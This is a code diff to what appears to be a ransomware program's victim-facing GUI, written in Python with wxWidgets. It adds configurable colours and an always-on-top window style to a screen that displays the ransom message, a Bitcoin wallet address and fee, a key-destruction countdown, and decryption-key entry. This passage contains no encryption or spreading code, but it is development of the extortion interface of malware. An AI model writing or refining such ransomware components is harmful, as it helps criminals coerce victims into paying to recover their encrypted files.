@@ -379,6 +379,22 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		@summary: Method to update the GUI visuals/aesthetics, i.e labels, images etc.
 		'''
 		
+		# Set Frame Style
+		style = wx.CAPTION|wx.CLOSE_BOX|wx.MINIMIZE_BOX|wx.SYSTEM_MENU|wx.TAB_TRAVERSAL
+		if self.__config["make_gui_resizeable"]:
+			style = style|wx.RESIZE_BORDER
+		if self.__config["always_on_top"]:
+			style = style|wx.STAY_ON_TOP
+		self.SetWindowStyle(style)
+		
+		# Background Colour
+		self.SetBackgroundColour(wx.Colour(
+			self.__config["background_colour"][0],
+			self.__config["background_colour"][1],
+			self.__config["background_colour"][2]
+			)
+		)
+		
 		# Icon
 		self.SetIcon(wx.IconFromBitmap(wx.Bitmap(
 				os.path.join(self.image_path, self.GUI_IMAGE_ICON),
@@ -394,9 +410,16 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 			)
 		)
 		self.TitleLabel.SetLabel(self.GUI_LABEL_TEXT_TITLE[self.LANG].upper())
+		self.TitleLabel.SetForegroundColour(wx.Colour(
+			self.__config["heading_font_colour"][0],
+			self.__config["heading_font_colour"][1],
+			self.__config["heading_font_colour"][2],
+			)
+		)
 		
-		# Set flashing text initial label
+		# Set flashing text initial label and Colour
 		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
+		self.__set_as_primary_colour(self.FlashingMessageText)
 		
 		# Set Ransom Message
 		self.RansomMessageText.SetValue(self.__config["ransom_message"])
@@ -419,21 +442,54 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 
 		# Set key destruction label
 		self.TimeRemainingLabel.SetLabel(self.GUI_LABEL_TEXT_TIME_REMAINING[self.LANG])
+		self.__set_as_primary_colour(self.TimeRemainingLabel)
 
 		# Set Wallet Address label
 		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS[self.LANG])
+		self.__set_as_primary_colour(self.WalletAddressLabel)
 		
 		# Set Wallet Address Value
 		self.WalletAddressString.SetLabel(self.__config["wallet_address"])
+		self.__set_as_secondary_colour(self.WalletAddressString)
 
 		# Set Bitcoin Fee label
 		self.BitcoinFeeLabel.SetLabel(self.GUI_LABEL_TEXT_BITCOIN_FEE[self.LANG])
+		self.__set_as_primary_colour(self.BitcoinFeeLabel)
 
 		# Set Bitcoin Fee Value
 		self.BitcoinFeeString.SetLabel(self.__config["bitcoin_fee"])
+		self.__set_as_secondary_colour(self.BitcoinFeeString)
+
+		# Set Timer font colour
+		self.__set_as_secondary_colour(self.TimeRemainingTime)
 		
 		# Set Button Text
 		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES[self.LANG])
 		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY[self.LANG])
+		
+	
+	def __set_as_secondary_colour(self, obj):
+		'''
+		@summary: Sets the objects foreground colour to the secondary colour specified by the config
+		'''
+		
+		obj.SetForegroundColour(wx.Colour(
+			self.__config["secondary_font_colour"][0],
+			self.__config["secondary_font_colour"][1],
+			self.__config["secondary_font_colour"][2]
+			)
+		)
+		
+	def __set_as_primary_colour(self, obj):
+		'''
+		@summary: Sets the objects foreground colour to the primary colour specified by the config
+		'''
+		
+		obj.SetForegroundColour(wx.Colour(
+			self.__config["primary_font_colour"][0],
+			self.__config["primary_font_colour"][1],
+			self.__config["primary_font_colour"][2]
+			)
+		)
 		
 		
